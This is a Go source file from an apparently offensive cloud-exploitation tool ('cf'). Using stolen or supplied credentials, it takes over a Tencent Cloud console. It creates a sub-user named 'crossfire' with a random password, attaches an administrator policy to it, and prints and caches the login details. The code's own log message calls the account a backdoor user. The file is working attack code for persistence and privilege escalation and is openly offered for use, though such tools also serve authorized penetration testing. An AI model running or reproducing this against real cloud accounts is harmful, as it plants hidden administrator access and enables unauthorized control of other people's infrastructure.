package tencentconsole

import (
	log "github.com/sirupsen/logrus"
	"github.com/teamssix/cf/pkg/cloud"
	"github.com/teamssix/cf/pkg/cloud/tencent/tencentcam"
	"github.com/teamssix/cf/pkg/util"
	"github.com/teamssix/cf/pkg/util/database"
	"github.com/teamssix/cf/pkg/util/errutil"
	cam "github.com/tencentcloud/tencentcloud-sdk-go/tencentcloud/cam/v20190116"
	"github.com/tencentcloud/tencentcloud-sdk-go/tencentcloud/common"
)

func CreateUser(randomPasswords string) {
	request := cam.NewAddUserRequest()
	request.Name = common.StringPtr("crossfire")
	request.ConsoleLogin = common.Uint64Ptr(1)
	request.Password = common.StringPtr(randomPasswords)
	request.NeedResetPassword = common.Uint64Ptr(0)
	_, err := tencentcam.CAMClient().AddUser(request)
	errutil.HandleErrNoExit(err)
	if err == nil {
		log.Debugln("创建 crossfire 用户成功 (Create crossfire user successfully)")
	}
}

func GetUserUin() uint64 {
	request := cam.NewGetUserRequest()
	request.Name = common.StringPtr("crossfire")
	response, err := tencentcam.CAMClient().GetUser(request)
	errutil.HandleErrNoExit(err)
	if err == nil {
		log.Debugln("获取 crossfire 用户UIN (Get crossfire user Uin successfully)")
	}
	return *response.Response.Uin
}

func AttachPolicyToUser() {
	UserUin := GetUserUin()
	request := cam.NewAttachUserPolicyRequest()
	request.PolicyId = common.Uint64Ptr(1)
	request.AttachUin = common.Uint64Ptr(UserUin)
	_, err := tencentcam.CAMClient().AttachUserPolicy(request)
	errutil.HandleErrNoExit(err)
	if err == nil {
		log.Debugln("成功为 crossfire 用户赋予管理员权限 (Successfully grant AdministratorAccess policy to the crossfire user)")
	}
}

func GetOwnerUin() string {
	request := cam.NewGetUserAppIdRequest()
	response, err := tencentcam.CAMClient().GetUserAppId(request)
	errutil.HandleErrNoExit(err)
	OwnerUin := response.Response.OwnerUin
	return *OwnerUin
}

func TakeoverConsole() {
	password := util.GenerateRandomPasswords()
	CreateUser(password)
	AttachPolicyToUser()
	OwnerID := GetOwnerUin()
	userName := "crossfire"
	loginURL := "https://cloud.tencent.com/login/subAccount"
	data := [][]string{
		{OwnerID, userName, password, loginURL},
	}
	database.InsertTakeoverConsoleCache("tencent", OwnerID, userName, password, loginURL)
	var header = []string{"主账号 ID (Primary Account ID)", "子用户名 (Sub User Name)", "登录密码 (Password)", "控制台登录地址 (Login URL)"}
	var td = cloud.TableData{Header: header, Body: data}
	cloud.PrintTable(td, "")
	log.Infoln("接管控制台成功，接管控制台会创建 crossfire 这个后门用户，如果想删除该后门用户，请执行 cf tencent console cancel 命令。(Successfully take over the console. Since taking over the console creates the backdoor user crossfire, if you want to delete the backdoor user, execute the command cf tencent console cancel.)")
}
